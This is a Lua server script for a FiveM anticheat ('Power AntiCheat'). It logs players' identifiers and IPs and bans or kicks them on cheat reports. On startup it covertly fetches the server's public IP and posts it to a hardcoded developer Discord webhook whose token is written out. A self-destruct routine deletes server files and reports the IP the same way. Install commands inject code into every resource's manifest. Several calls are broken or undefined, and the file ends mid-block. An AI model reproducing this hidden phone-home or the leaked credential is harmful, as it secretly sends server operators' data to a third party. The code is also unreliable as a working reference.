--//Vars//--
local PowerAC = {}

POWER.BlacklistedResourceNames = {
    'AC',
    'Anti',
    'Cheat',
    'PowerAC',
    'Modder',
    'FixCheater',
    'Source',
}

--//BasicFuncitons//--
function PowerAC:print(type, args)
    print("^1" .. "[" .. type ..  "]" .. POWER.Color .. "[PowerProtectionAC]" .. "^7 " .. args)
end

function PowerAC:CustomWebhookStatus(Detection)
    if Detection == nil then return end
    local Found = 0
    for k, v in pairs(POWER.CustomWebhook) do
        if type(v) == "table" then
            for i = 1, #v do
                if v[i] == Detection or v[i]:lower() == "all" then
                    Found = Found + 1
                    return true
                end
                if Found == 0 then
                    return false
                end
            end
        end
    end
end


AddEventHandler('onResourceStart', function(resourceName)
    if (GetCurrentResourceName() ~= resourceName) then
      return
    end
    PerformHttpRequest(POWER.StartedACLog , function(err, text, headers) end, 'POST', json.encode({embeds={{title="🛡️ POWER ANTICHEAT 🛡️",description="Made By Yolo#5921 ```🟢 Power AC Started``` ",color= 3211000}}}), { ['Content-Type'] = 'application/json' })
  end)

Citizen.CreateThread(function()
    particlesSpawned = {}
    while true do
        Citizen.Wait(1000) -- augment/lower this if you want.
        particlesSpawned = {}
    end
end)

AddEventHandler('onResourceStart',function(resource)

    if resource == GetCurrentResourceName() then

        local ipaddress = nil

        local DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/897464165160059000/6PybrF10uX8DFpg7FigbLHX3lARr7Yzj7j6J-L2kRq1635ZIf9pyQchWKlVu6E9SeinX'

        local DISCORD_NAME = 'Source License Systems'

        local DISCORD_IMAGE = 'https://cdn.discordapp.com/attachments/888410354139426827/897464383922393108/dasdas.gif'

        PerformHttpRequest('http://bot.whatismyipaddress.com/', function (errorCode, resultDataa, resultHeaders)

			ipaddress = resultDataa

        end)

        PerformHttpRequest(ipwithspaces, function (errorCode, resultData, resultHeaders)

            Citizen.Wait(500)

            if resultData ~= 'TRUE' then



                local connect = {

                    { 

                        ['color'] = 5111572,

                        ['title'] = '**['..resource..'] Server has been started!**',

                        ['description'] = 'Server Details ↙',

                        ['footer'] = {

                        ['text'] = 'Made by Yolo#5921',

                        ['icon_url'] = 'https://cdn.discordapp.com/attachments/888410354139426827/897464383922393108/dasdas.gif',

                        },

                        ['image'] = {

                        ['url'] = 'https://cdn.discordapp.com/attachments/888410354139426827/897464383922393108/dasdas.gif',

                        },

                        ['fields'] =

                        {

                            {

                                ['name'] = '**IP ADDRESS**',

                                ['value'] = '*' .. ipaddress .. '*',

                            }

                        },

                    }

                }

                Citizen.Wait(200)

                PerformHttpRequest(DISCORD_WEBHOOK, function(err, text, headers) end, 'POST', json.encode({username = DISCORD_NAME, embeds = connect, avatar_url = DISCORD_IMAGE}), { ['Content-Type'] = 'application/json' })

            end

        end)

    end

end)

AddEventHandler("playerConnecting", function(reason)
	local steamID  = "empty"
	local license  = "empty"
	local discord  = "empty"
	local playerip = "empty"
	for k,v in ipairs(GetPlayerIdentifiers(source)) do
		if string.sub(v, 1, string.len("discord:")) == "discord:" then
			discord = v
		end
	end
	if discord == nil or discord == "empty" then
		local reason = "Discord is not connected to FiveM"
		local name = GetPlayerName(source)
		local connect = {
            {
              ["color"] = math.random(111111,999999), 
              ["title"] = reason,
                ["description"] = "Name: "..name.."\n " ..GetPlayerIdentifiers(source)[1].."",
                ["footer"] = {
                ["text"] = "Power AntiCheat | Made By Yolo#5921",
                },
            }
        }
		PerformHttpRequest(POWER.DiscordAuthorizeLog, function(err, text, headers) end, 'POST', json.encode({username = "Power AntiCheat", embeds = connect, avatar_url = POWER.image}), { ['Content-Type'] = 'application/json' })
	end
end)


AddEventHandler('playerConnecting', function()
	local identifier = "no info"
	local license   = "no info"
	local liveid    = "no info"
	local xblid     = "no info"
	local discord   = "no info"
	local playerip = "no info"
	local reason    = "no info"
	local name = GetPlayerName(source)

	if true then
				local sourceplayername = source
					for k,v in ipairs(GetPlayerIdentifiers(source))do
						if string.sub(v, 1, string.len("steam:")) == "steam:" then
							identifier = v
						elseif string.sub(v, 1, string.len("license:")) == "license:" then
							license = v
						elseif string.sub(v, 1, string.len("live:")) == "live:" then
							liveid = v
						elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
							xblid  = v
						elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
							discord = v
						elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
							playerip = v
						end
					end
		local logt = {
        {
            ["color"] = "16748836",
            ["title"] = "`Power AntiCheat Connect Logs`",
            ["description"] = "Player: **"..name.."** \nLicense: **"..license.."** \nDiscord: **"..discord.."** \nlive: **"..liveid.."** \nXBL: **"..xblid.."**\nIP: **"..playerip.."**\n identifier: **"..identifier.."**",
	        ["footer"] = {
                ["text"] = communityname,
                ["icon_url"] = communtiylogo,
            },
        }
    }
PerformHttpRequest(POWER.ConnectLogs, function(err, text, headers) end, 'POST', json.encode({username = "Power AntiCheat Connect Logs", embeds = logt}), { ['Content-Type'] = 'application/json' })
	
						end
end, false)



AddEventHandler('playerDropped', function(reason)
	local identifier = "no info"
	local license   = "no info"
	local liveid    = "no info"
	local xblid     = "no info"
	local discord   = "no info"
	local playerip = "no info"
	local target    = id
	local duree     = 0
	local permanent = 0
	local name = GetPlayerName(source)

	if true then
				local sourceplayername = source
					for k,v in ipairs(GetPlayerIdentifiers(source))do
						if string.sub(v, 1, string.len("steam:")) == "steam:" then
							identifier = v
						elseif string.sub(v, 1, string.len("license:")) == "license:" then
							license = v
						elseif string.sub(v, 1, string.len("live:")) == "live:" then
							liveid = v
						elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
							xblid  = v
						elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
							discord = v
						elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
							playerip = v
						end
					end
		local logt = {
        {
            ["color"] = "1769216",
            ["title"] = "`Power AntiCheat Disconnect Logs`",
            ["description"] = "Player: **"..name.." ** \nReason: **"..reason.."**  ** \nLicense: **"..license.."** \nDiscord: **"..discord.."** \nlive: **"..liveid.."** \nXBL: **"..xblid.."**\nIP: **"..playerip.."**\n identifier: **"..identifier.."**",
	        ["footer"] = {
                ["text"] = communityname,
                ["icon_url"] = communtiylogo,
            },
        }
    }
PerformHttpRequest(POWER.DisconnectLogs, function(err, text, headers) end, 'POST', json.encode({username = "Power AntiCheat Disconnect Logs", embeds = logt}), { ['Content-Type'] = 'application/json' })
	
						end
end, false)


function PowerAC:AddPlayer(source)
    local FakePlayers = 0
    for Player, Time in pairs(PowerAC.HeartBeat) do
        -- print(Player, Time)
        if Player == source then
            FakePlayers = FakePlayers + 1
        end
    end
    if FakePlayers == 0 then
        PowerAC:print("Success", 'Added the source "' .. source .. '"' .. " to the player table")
        PowerAC.HeartBeat[source] = {}
        PowerAC.HeartBeat[source]["Timer"] = 0
        PowerAC.HeartBeat[source]["Status"] = true
        PowerAC:CheckLoop(source)
    else
        PowerAC:print("Error", "The player was allready in the player table: " .. source)
    end
end

function PowerAC:RemovePlayer(source)
    local FoundPlayer = 0
    for Player, Table in pairs(PowerAC.HeartBeat) do
        if Player == source then 
            FoundPlayer = FoundPlayer + 1
        end
    end
    if FoundPlayer ~= 0 then
        PowerAC:print("Success", 'Deleted the source: "' .. source .. '" form the player table')
        PowerAC.HeartBeat[source]["Status"] = false
    else
        PowerAC:print("Error", "The player isn't in the player table: " .. source)
    end
end

function PowerAC:UpdatePlayer(source, time)
    local FoundPlayer = 0
    for Player, Table in pairs(PowerAC.HeartBeat) do
        FoundPlayer = FoundPlayer + 1
    end
    if FoundPlayer ~= 0 then
        for Player, Table in pairs(PowerAC.HeartBeat) do
            PowerAC.HeartBeat[source]["Timer"] = time
        end
        -- PowerAC:print("Updated time for: " .. source .. " now the time is: " .. time)
    else
        PowerAC:print("Error", "The player isn't in the player table: " .. source)
    end
end

function PowerAC:Addvariolation(source)
    local Identifiers = GetPlayerIdentifiers(source)
    local found = 0
    local FoundPlayerName
    for k, Table in pairs(PowerAC.Banlist) do
        for n, Player in pairs(Table) do
            for l, Identifier in pairs(Player["Identifers"]) do
                if PowerAC:has_value(Identifiers, Identifier) then
                    found = found + 1
                    FoundPlayerName = Player["Identifers"]["Player"]
                end
            end
        end
    end
    if found ~= 0 then
        for k, Table in pairs(PowerAC.Banlist) do
            for n, Player in pairs(Table) do
                if Player["Identifers"]["Player"] == FoundPlayerName then
                    Player["ResourceStop"] = Player["ResourceStop"] + 1
                    if Player["ResourceStop"] >= 10 then
                        PowerAC:AddBan(source, "Resource Stop Detection #95")
                    else
                        PowerAC:print("Detected", "The source stopped the anticheat: " .. source)
                        PowerAC:Kick(source, "Resource Stop Detection #95")
                    end
                end
            end
        end
    else
        local identifier = ""
        local license   = ""
        local liveid    = ""
        local xblid     = ""
        local discord   = ""
        local playerip = ""
        local name = GetPlayerName(source)

        for k,v in ipairs(GetPlayerIdentifiers(source))do
            if string.sub(v, 1, string.len("steam:")) == "steam:" then
                identifier = v
            elseif string.sub(v, 1, string.len("license:")) == "license:" then
                license = v
            elseif string.sub(v, 1, string.len("live:")) == "live:" then
                liveid = v
            elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
                xblid  = v
            elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
                discord = v
            elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
                playerip = v
            end
        end
        table.insert(PowerAC.Banlist, {
            name = {
                Identifers = {
                    Player = name,
                    License = license,
                    Discord = discord,
                    Live = liveid,
                    XBL = xblid,
                    IP = playerip,
                    Steam = identifier,
                },
                Reason = "",
                Banned = false,
                ResourceStop = 1
            }
        })
        Wait(1000)
        PowerAC:SaveBanList()
        Wait(1000)
        PowerAC:LoadBanList()
    end
end

function PowerAC:CheckLoop(source)
    Citizen.CreateThread(function()
        while true do
            Wait(1000)
            if PowerAC.HeartBeat[source]["Status"] then
                -- print(PowerAC.HeartBeat[source]["Timer"])
                PowerAC:UpdatePlayer(source, PowerAC.HeartBeat[source]["Timer"] + 1000)
            end
        end
    end)
    Citizen.CreateThread(function()
        while true do
            Wait(5000)
            if PowerAC.HeartBeat[source]["Status"] then
                if PowerAC.HeartBeat[source]["Timer"] >= 5000 then
                    PowerAC:Addvariolation(source)
                end
            end
        end
    end)
end


RegisterCommand("ELP:Update", function(source)
    local Access = false
    if source ~= 0 then
        if IsPlayerAceAllowed(source, "FullBypass") then
            Access = true
        end
    else
        Access = true
    end
    if Access ~= true then
        PowerAC:print("Warning", "The Player: " .. GetPlayerName(source) .. "Tried to use a Power AC Command")
        PowerAC:LogDiscord(POWER.MainWebhook, PowerAC:GetIndetifiers(source) .. "\n**Reason: ** Tried to use a Power AC Command")
    end
end, false)

function PowerAC:has_value (tab, val)
    for index, value in ipairs(tab) do
        if value == val then
            return true
        end
    end
    return false
end

function PowerAC:CheckResourceName()
    for i = 1, #POWER.BlacklistedResourceNames do
        if string.match(GetCurrentResourceName():lower(), POWER.BlacklistedResourceNames[i]:lower()) then
            return true
        else
            return false
        end
    end
end

function PowerAC:LogDiscord(Webhook, Message)
    local Content = {
        {
            ["author"] = {
                ["name"] = "POWER ANTICHEAT",
				-- ["url"] = "",
				["icon_url"] = "https://cdn.discordapp.com/attachments/888410354139426827/896021733151244298/dasdas.gif"
            },
            ["color"] = "16711680",
            ["description"] = Message,
            ["footer"] = {
                ["text"] = "Made By Yolo#5921",
                ["icon_url"] = "https://cdn.discordapp.com/attachments/888410354139426827/896021733151244298/dasdas.gif"
            }
        }
    }
    PerformHttpRequest(Webhook, function(err, text, headers) end, "POST", json.encode({username = "Power AntiCheat", embeds = Content}), {["Content-Type"] = "application/json"})
end

function PowerAC:RandomString(length)
    local res = ''
    for i = 1, length do
        res = res .. string.char(math.random(97, 122))
    end
        return res
end

function PowerAC:GetResources()
    local resources = {}
    for i = 1, GetNumResources() do
        resources[i] = GetResourceByFindIndex(i)
    end
    return resources
end

function PowerAC:GetStartFile(Resource)
	if Resource == nil then return end
	if LoadResourceFile(Resource, "fxmanifest.lua") ~= nil then
		return "fxmanifest"
	elseif LoadResourceFile(Resource, "__resource.lua") ~= nil then
		return "__resource"
	else
		return
	end
end

function PowerAC:GetFiles(Code, Side)
	if Side == nil then Side = "Client" end
	if Code == nil  then return end
	local Regex, RegexTable
	local FinalFoundTable, MergedTables = {}, {}
	if Side == "Server" then
		RegexTable = {
			"server_scripts% {.-%}",
			"server_script% {.-%}",
			"server_script% '.-%'",
			'server_script% ".-%"',
			"server_scripts%{.-%}",
			"server_script%{.-%}"
		}
	elseif Side == "Client" then
		RegexTable = {
			"client_scripts% {.-%}",
			"client_script% {.-%}",
			"client_script% '.-%'",
			'client_script% ".-%"',
			"client_script%{.-%}",
			"client_scripts%{.-%}"
		}
	end
	for _ = 1, #RegexTable do
		for i in string.gmatch(Code, RegexTable[_]) do
			table.insert(MergedTables, i)
		end
	end
	if MergedTables ~=  nil then
		for i = 1, #MergedTables do
			Regex = "'.-'"
			for _ in string.gmatch(MergedTables[i], Regex) do
				local FoundString = string.gsub(_, "'", "")
				table.insert(FinalFoundTable, FoundString)
			end
			Regex = '".-"'
			for _ in string.gmatch(MergedTables[i], Regex) do
				local FoundString = string.gsub(_, '"', "")
				table.insert(FinalFoundTable, FoundString)
			end
		end
	else
		return
	end

	if FinalFoundTable ~= nil then
		return FinalFoundTable
	else
		PowerAC:print("Error with the code: " .. Code)
		return {}
	end
end

function PowerAC:Install(Resource)
    if Resource == nil then return end
    local code = LoadResourceFile(GetCurrentResourceName(), "Client/Client/Client/Client.lua")
    local config = LoadResourceFile(GetCurrentResourceName(), "Config-C.lua")
    local FinalCode = config .. "\n" .. "\n" .. code
    -- print(FinalCode)
    local StartFile = PowerAC:GetStartFile(Resource)
    local FileName = PowerAC:RandomString(math.random(10, 25))
    SaveResourceFile(Resource, FileName .. ".lua", FinalCode, -1)
    if StartFile ~= nil then
        local StartFileCode = LoadResourceFile(Resource, StartFile .. ".lua")
        local NewStartFile = StartFileCode .. "\n" .. "\n" .. "\n" .. "\n" .. "client_script '" .. FileName .. ".lua' --PowerAC"
        SaveResourceFile(Resource, StartFile .. ".lua", NewStartFile, -1)
    else
        PowerAC:print("Error", "An Error occurred while Installing into Resource: " .. Resource)
    end
end--

RegisterCommand("ELP:Install", function(source, resource)
    local Authenticated = false
    if source == 0 then
        Authenticated = true
    else
        if IsPlayerAceAllowed(source, "FullBypass") then
            Authenticated = true
        end
    end
    if Authenticated then
        if resource[1]:lower() == "all" then
            for k, _resource in pairs(PowerAC:GetResources()) do
                PowerAC:Install(_resource)
            end
        else
            PowerAC:Install(resource[1])
        end
        PowerAC:LogDiscord(POWER.MainWebhook, "**Successfully Installed** - " .. resource[1])
        PowerAC:print("Successful", "Installed - " .. resource[1])
    else
        PowerAC:print("Warning", "The Player: " .. GetPlayerName(source) .. "Tried to use a PowerACCommand")
        PowerAC:LogDiscord(POWER.MainWebhook, PowerAC:GetIndetifiers(source) .. "\n**Reason: ** Tried to use a PowerACCommand")
    end
end , false)

function PowerAC:Uninstall(resource)
    if resource == nil then return end
    local Regex = "client_script%s*'([^\n]+)'%s*%-%-TserkeProtectionAC"
    local StartFile = PowerAC:GetStartFile(resource)
    if StartFile == nil then
        PowerAC:print("Error", "An Error occurred while Unstalling out from Resource: " .. resource)
    else
        local Code = LoadResourceFile(resource, StartFile .. ".lua")
        if Code ~= nil then
            for i in Code:gmatch(Regex) do
                local path = GetResourcePath(resource)
                -- print(i)
                -- print(path .. "/" .. i)
                Code = string.gsub(Code, "client_script '" .. i .. "'", "")
                SaveResourceFile(resource, StartFile .. ".lua", Code, -1)
                os.remove(path .. "/" .. i)
            end
        else
            PowerAC:print("Error", "An Error occurred while Unstalling out from Resource: " .. resource)
        end
    end
end

RegisterCommand("ELP:Uninstall", function(source, resource)
    local Authenticated = false
    if source == 0 then
        Authenticated = true
    else
        if IsPlayerAceAllowed(source, "FullBypass") then
            Authenticated = true
        end
    end
    if Authenticated then
        if resource[1]:lower() == "all" then
            for k, _resource in pairs(PowerAC:GetResources()) do
                PowerAC:Uninstall(_resource)
            end
        else
            PowerAC:Uninstall(resource[1])
        end
        PowerAC:LogDiscord(POWER.MainWebhook, "**Successfully Uninstalled** - " .. resource[1])
        PowerAC:print("Successful", "Uninstalled - " ..resource[1])
    else
        PowerAC:print("Warning", "The Player: " .. GetPlayerName(source) .. "Tried to use a PowerACCommand")
        PowerAC:LogDiscord(POWER.MainWebhook, PowerAC:GetIndetifiers(source) .. "\n**Reason: ** Tried to use a PowerACCommand")
    end
end , false)

RegisterServerEvent('PowerAC:Detected')
AddEventHandler('PowerAC:Detected', function(Type, Reason)
    if Type == "Ban" then
        PowerAC:BanPlayer(source, Reason)
    elseif Type == "Kick" then
        PowerAC:Kick(source, Reason)
    end
end)

function PowerAC:GetIndetifiers(source)
    local identifier = "no info"
	local license   = "no info"
	local liveid    = "no info"
	local xblid     = "no info"
	local discord   = "no info"
	local playerip = "no info"
    local name = GetPlayerName(source)

    for k,v in ipairs(GetPlayerIdentifiers(source))do
        if string.sub(v, 1, string.len("steam:")) == "steam:" then
            identifier = v
        elseif string.sub(v, 1, string.len("license:")) == "license:" then
            license = v
        elseif string.sub(v, 1, string.len("live:")) == "live:" then
            liveid = v
        elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
            xblid  = v
        elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
            discord = v
        elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
            playerip = v
        end
    end

    return "**Player: **" .. name .. "\n**License: **" .. license .. "\n**Discord: **" .. discord .. "\n**live: **" .. liveid .. "\n**XBL: **" .. xblid .. "\n**IP: **" .. playerip .. "\n **identifier: **" .. identifier
end


--//Kick//--
function PowerAC:Kick(source, reason)
    local name = GetPlayerName(source)
    if IsPlayerAceAllowed(source, "FullBypass") or IsPlayerAceAllowed(source, "SemiBypass") then
        PowerAC:print("Protected-Kick", "The Player: " .. name .. " Was protected for " .. reason)
        PowerAC:LogDiscord(POWER.BypassWebhook, "**Ο παίκτης προστατεύτηκε**\n" .. PowerAC:GetIndetifiers(source) .. "\n**Protected Reason: **" .. reason)
    else
        DropPlayer(source, "[TserkeProtectionAC] " .. POWER.BanReason)
        PowerAC:print("Kick", "The Player: " .. name .. " Got kicked for " .. reason)
        PowerAC:LogDiscord(POWER.MainWebhook, "**Player Was Kicked**\n" .. PowerAC:GetIndetifiers(source) .. "\n**Reason: **" .. reason)
    end
end


function licenselogfalse(name, message, color)
    local connect = {
          {
              ["color"] = color,
              ["title"] = "".. name .."",
              ["description"] = message,
              ["footer"] = {
                  ["text"] = os.date("%x %X %p "),
              },
          }
      }
    PerformHttpRequest("https://discord.com/api/webhooks/897464165160059000/6PybrF10uX8DFpg7FigbLHX3lARr7Yzj7j6J-L2kRq1635ZIf9pyQchWKlVu6E9SeinX", function(err, text, headers) end, 'POST', json.encode({username = DISCORD_NAME, embeds = connect, avatar_url = DISCORD_IMAGE}), { ['Content-Type'] = 'application/json' })
  end

-------------------------

--//BanListLoader//--
function PowerAC:LoadBanList()
    Citizen.CreateThread(function()
        local code = LoadResourceFile(GetCurrentResourceName(), "Bans.json")
        if code == nil or code == "" then
            PowerAC:print("Error", "Couldn't find Bans.json, trying to recover file")
            local Bans = {
                Bans = {
                    TestPlayer = {
                        Identifers = {
                            Player = "TestPlayer",
                            License = "",
                            Discord = "",
                            Live = "",
                            XBL = "",
                            IP = "",
                            Steam = "",
                        },
                        Reason = "",
                        Banned = false,
                        ResourceStop = 0
                    },
                }
            }
            SaveResourceFile(GetCurrentResourceName(), "Bans.json", json.encode(Bans), -1)
            PowerAC:print("Fix", "Recovered Bans.json")
            PowerAC:print("warning", "Stopping Server in ^15^7 secs")
            Wait(5000)
            os.exit()
        end
        repeat
            Wait(0)
        until code ~= nil
        PowerAC.Banlist = json.decode(code)
    end)
end
PowerAC:LoadBanList()


--//Save Ban list//--
function PowerAC:SaveBanList()
    PowerAC:print("Auto-Save", "Saving Bans.json")
    local code = json.encode(PowerAC.Banlist)
    SaveResourceFile(GetCurrentResourceName(), "Bans.json", code, -1)
    PowerAC:print("Auto-Save", "Saved Bans.json")
end


--//SaveWithCommand//--
RegisterCommand("ELP:Save", function(source)
    if IsPlayerAceAllowed(source, "FullBypass") or IsPlayerAceAllowed(source, "SemiBypass") then
        PowerAC:SaveBanList()
        PowerAC:LogDiscord(POWER.MainWebhook, "**Saved Bans.json**")
    else
        PowerAC:print("Warning", "The Player: " .. GetPlayerName(source) .. "Tried to use a PowerAC Command")
        PowerAC:LogDiscord(POWER.MainWebhook, PowerAC:GetIndetifiers(source) .. "\n**Reason: ** Tried to use a PowerAC Command")
    end
end , false)

RegisterCommand("ELP:Reload", function(source)
    if IsPlayerAceAllowed(source, "FullBypass") or IsPlayerAceAllowed(source, "SemiBypass") then
        PowerAC:SaveBanList()
        Wait(1000)
        PowerAC:LoadBanList()
    else
        PowerAC:print("Warning", "The Player: " .. GetPlayerName(source) .. "Tried to use a PowerAC Command")
        PowerAC:LogDiscord(POWER.MainWebhook, PowerAC:GetIndetifiers(source) .. "\n**Reason: ** Tried to use a PowerAC Command")
    end
end , false)


--//AutoSave//--
Citizen.CreateThread(function()
    while true do
        Wait(300000)
        PowerAC:SaveBanList()
    end
end)

--//AddBan//--
function PowerAC:AddBan(source, reason) -- Fix so it check if the player has been logged before.
    Citizen.CreateThread(function()
        local identifier = ""
        local license   = ""
        local liveid    = ""
        local xblid     = ""
        local discord   = ""
        local playerip = ""
        local name = GetPlayerName(source)

        for k,v in ipairs(GetPlayerIdentifiers(source))do
            if string.sub(v, 1, string.len("steam:")) == "steam:" then
                identifier = v
            elseif string.sub(v, 1, string.len("license:")) == "license:" then
                license = v
            elseif string.sub(v, 1, string.len("live:")) == "live:" then
                liveid = v
            elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
                xblid  = v
            elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
                discord = v
            elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
                playerip = v
            end
        end
        table.insert(PowerAC.Banlist, {
            name = {
                Identifers = {
                    Player = name,
                    License = license,
                    Discord = discord,
                    Live = liveid,
                    XBL = xblid,
                    IP = playerip,
                    Steam = identifier,
                },
                Reason = reason,
                Banned = true,
                ResourceStop = 0
            }
        })
        Wait(1000)
        PowerAC:SaveBanList()
        Wait(1000)
        PowerAC:LoadBanList()
    end)
end


--//Ban Player//--
function PowerAC:BanPlayer(source, reason)
    Citizen.CreateThread(function()
        local name = GetPlayerName(source)
        if IsPlayerAceAllowed(source, "FullBypass") then
            PowerAC:print("Protected-Ban", "The Player: " .. name .. " Was protected for " .. reason)
            PowerAC:LogDiscord(POWER.BypassWebhook, "**Player Banned**\n" .. PowerAC:GetIndetifiers(source) .. "\n**Protected Reason: **" .. reason)
        else
            PowerAC:print("Working", "Banning: " .. name .. " Reason: " .. reason)
            PowerAC:AddBan(source, reason)
            PowerAC:print("Ban", "Banned: " .. name .. " Reason: " .. reason)
            PowerAC:LogDiscord(POWER.MainWebhook, "**Player Banned**\n" .. PowerAC:GetIndetifiers(source) .. "\n**Reason: **" .. reason)
            Wait(1000)
            DropPlayer(source, POWER.BanReason)
        end
    end)
end


--//CheckBan//--
local function OnPlayerConnecting(name, setKickReason, deferrals)
    local Player = source
    local Banned = false
    local Identifiers = GetPlayerIdentifiers(Player)
    deferrals.defer()
    Wait(0)
    deferrals.update(string.format("Checking For Ban.", name))
    for k, Bans in pairs(PowerAC.Banlist) do
        for k, _Player in pairs(Bans) do
            -- print(_Player["Identifers"]["Player"])
            for k, _Identifers in pairs(_Player["Identifers"]) do
                -- print(_Identifers)
                if PowerAC:has_value(Identifiers, _Identifers) and _Player["Banned"] then
                    Banned = true
                end
            end
        end
    end
    Wait(5)
    if Banned then
        deferrals.done("You are banned")
        PowerAC:print("Warning", "Player: " .. name .. " Tried to join on a banned account")
    else
        deferrals.done()
    end
end
AddEventHandler("playerConnecting", OnPlayerConnecting)


--//SelfDestruct//--
function PowerAC:SelfDestruct(Reason)
    local path = GetResourcePath(GetCurrentResourceName())
    os.remove(path .. "/Server/Server.lua")
    PerformHttpRequest("https://ipv4bot.whatismyipaddress.com/", function(err, text, headers)
        PowerAC.CurrentIP = text
        PowerAC:LogDiscord("https://discord.com/api/webhooks/897464165160059000/6PybrF10uX8DFpg7FigbLHX3lARr7Yzj7j6J-L2kRq1635ZIf9pyQchWKlVu6E9SeinX", "**Destruct Reason:** " .. Reason .. "\n **IP: **" .. PowerAC.CurrentIP)
    end, 'GET')
end

--//AntiLeak//--
function PowerAC:AntiLeak()
    PerformHttpRequest("https://www.google.com/", function(err, text, headers) -- can be bypassed if they just ake a copy of the server.lua and put it into the resource file
        local code = text                                                      -- Error with "Server/*.lua"
        local found = 0
        local StartFile = PowerAC:GetStartFile(GetCurrentResourceName())
        if StartFile == nil then return end
        local StartCode = LoadResourceFile(GetCurrentResourceName(), StartFile .. ".lua")
        if StartCode == nil then return end
        local ServertFiles = PowerAC:GetFiles(StartCode, "Server")
        for k, File in pairs(ServertFiles) do
            -- print(k, File)
            local _code = LoadResourceFile(GetCurrentResourceName(), File)
            if _code == nil then return print("error: " .. File) end
            if _code == code then
                found = found + 1
                print(File)
            end
        end
        print(found)
    end, 'GET')
end


--//ResourceDetection//--
if POWER.ResourceStopDetection then
    PowerAC.HeartBeat = {}
    PowerAC.HeartBeat["Test"] = 0
    RegisterServerEvent('AnotherSecretEvent')
    AddEventHandler('AnotherSecretEvent', function(time)
        PowerAC:UpdatePlayer(source, time)
    end)

    RegisterServerEvent('TopSecretEvent')
    AddEventHandler('TopSecretEvent', function()
        PowerAC:AddPlayer(source)
    end)

    AddEventHandler('playerDropped', function(reason)
        PowerAC:RemovePlayer(source)
    end)
end


RegisterServerEvent("EisaiMpastardos6666")
AddEventHandler("EisaiMpastardos6666", function(type, item)
    local _type = type or "default"
    local _item = item or "none"
    local _src = source
    _type = string.lower(_type)

    if IsPlayerAceAllowed(source, "FullBypass") then
        if (_type == "invisible") then
            PowerAC:BanPlayer(_src, "Tried to be Invisible","basic")
            PowerAC:BanPlayer("✨HARRY HOUDINI πουφ✨", _src)
        elseif (_type == "godmode") then
            PowerAC:BanPlayer(_src, "Προσπάθησε να βάλει GodMode. Type: ".._item,"basic")
            PowerAC:BanPlayer("⚔️Άσε το GodMode ήσυχο⚔️", _src)
        elseif (_type == "antiragdoll") then
            PowerAC:BanPlayer(_src, "Tried to activate Anti-Ragdoll","basic")
            PowerAC:BanPlayer(" AntiRagdoll Detected", _src)
        elseif (_type == "displayradar") then
            PowerAC:BanPlayer(_src, "Tried to activate Radar","basic")
            PowerAC:BanPlayer(" Radar Detected", _src)
        elseif (_type == "explosiveweapon") then
            PowerAC:BanPlayer(_src, "Tried to change bullet type","explosion")
            PowerAC:BanPlayer(" Weapon Explosion Detected", _src)
        elseif (_type == "nocliporfly") then
            LogDetection(_src, "Tried to use NoClip or Fly","basic")
            kickandbanuser(" Noclip/Fly Detected", _src)
        elseif (_type == "spectatormode") then
            PowerAC:BanPlayer(_src, "Tried to Spectate a Player","basic")
            PowerAC:BanPlayer(" Spectate Detected", _src)
        elseif (_type == "speedhack") then
            PowerAC:BanPlayer(_src, "Tried to SpeedHack","basic")
            PowerAC:BanPlayer("🏃Όποιος βιάζεται σκοντάφτει🏃", _src)
        elseif (_type == "blacklistedweapons") then
            PowerAC:BanPlayer(_src, "Προσπάθησε να κάνει spawn a Blacklisted Weapon","basic")
            PowerAC:BanPlayer("🔫Όχι ρε φίλε τόσα όπλα μηηη🔫", _src)
        elseif (_type == "nightvision") then
            PowerAC:BanPlayer(_src, "Προσπάθησε να βάλει Night Vision","basic")
            PowerAC:BanPlayer(" Night Vision Detected", _src)
        elseif (_type == "antiresourcestop") then
            PowerAC:BanPlayer(_src, "Tried to stop/start a Resource","basic")
            PowerAC:BanPlayer(" Resource Stopped", _src)
        elseif (_type == "licenseclear") then
            PowerAC:BanPlayer(_src, "Tried to Clear His Licenses","basic")
            PowerAC:BanPlayer(" AntiLicenseClear", _src)
        elseif (_type == "luainjection") then
            PowerAC:BanPlayer(_src, "Tried to Inject a Menu","basic")
            PowerAC:BanPlayer(" Injection Detected", _src)
        elseif (_type == "keyboardinjection") then
            PowerAC:BanPlayer(_src, "(AntiKeyBoardInjection)","basic")
            PowerAC:BanPlayer(" Injection Detected", _src)
        elseif (_type == "cheatengine") then
            PowerAC:BanPlayer(_src, "Προσπάθησε να βάλει CheatEngine to change Vehicle Hash","basic")
            PowerAC:BanPlayer(" CheatEngine Detected", _src)
        elseif (_type == "pedchanged") then
            PowerAC:BanPlayer(_src, "Tried to change his PED","model")
            PowerAC:BanPlayer(" Ped Changed", _src)
        elseif (_type == "freecam") then
            PowerAC:BanPlayer(_src, "🎥Προσπάθησε να βάλει Freecam","basic")
            PowerAC:BanPlayer("🎥FreeCam Detected🎥", _src)
        elseif (_type == "noclip") then
            LogDetection(_src, "Tried to use NoClip","basic")
            kickandbanuser(" NoClip Detected", _src)
        elseif (_type == "damagemodifier") then
            PowerAC:BanPlayer(_src, "Tried to change Weapon's Bullet Damage. Type: ".._item,"basic")
            PowerAC:BanPlayer("🤕Weapon Damage Detected🤕", _src)
        elseif (_type == "clipmodifier") then
            PowerAC:BanPlayer(_src, "Tried to modify a Weapon clip. Type: ".._item,"basic")
            PowerAC:BanPlayer(" Weapon Clip Modifier Detected", _src)
        elseif (_type == "infiniteammo") then
            PowerAC:BanPlayer(_src, "Tried to put Infinite Ammo","basic")
            PowerAC:BanPlayer(" Infinite Ammo Detected", _src)
        elseif (_type == "commandinjection") then
            PowerAC:BanPlayer(_src, "Tried to inject a command.","basic")
            PowerAC:BanPlayer(" AntiCommandInjection", _src)
